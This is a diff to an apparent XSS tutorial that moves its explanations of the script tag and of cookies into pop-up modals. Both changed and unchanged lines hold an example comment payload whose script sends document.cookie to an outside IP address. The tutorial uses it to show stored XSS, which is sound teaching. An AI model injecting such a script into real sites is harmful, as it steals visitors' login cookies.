@@ -45,13 +45,13 @@ That's a very nice picture! <br>
 Good photograph! <br>
 I **like** your photograph!
 
-HTML also supports `<script>`, for you to write `JavaScript` code on the webpage as well. 
+HTML also supports <trigger for="modal:script">`<script>`</trigger>, for you to write `JavaScript` code on the webpage as well. 
 
-*In HTML, anything between `<script>` and `</script>` will be run as `JavaScript`.*
+<modal title="**`<script>` and `</script>` in html**" id="modal:script">
+In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>. 
+</modal>
 
 What happens when a malicious user submits the following as a comment?
-
-> A **cookie** is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.
 
 ```html
 This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
@@ -66,7 +66,11 @@ This is an innocent looking comment.
 
 Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. 
 
-The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his cookie is stolen. 
+The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <trigger for="modal:cookie">cookie</trigger> is stolen. 
+
+<modal title="**What is a Cookie?**" id="modal:cookie">
+A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data. You can read more about it <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank">here</a>.
+</modal>
 
 Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.
 
@@ -165,7 +169,7 @@ You can also consider using XSS scanning tools to check whether your web applica
 
 ## Where to go from here?
 
-Although XSS is the most common web application vulnerability, there are also many other vulnerabilities. It is important to be aware of the other vulnerabilities to properly secure your web application. Here is a statistical 
+Although XSS is the most common web application vulnerability, there are also many other types of vulnerabilities. It is important to be aware of them to properly secure your web application. Here is a statistical 
 <a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">report</a> on web application vulnerabilities and a graphical summary retrieved from it: 
 
 ![Graphical Statistic](./Images/StatisticGraphic.png)
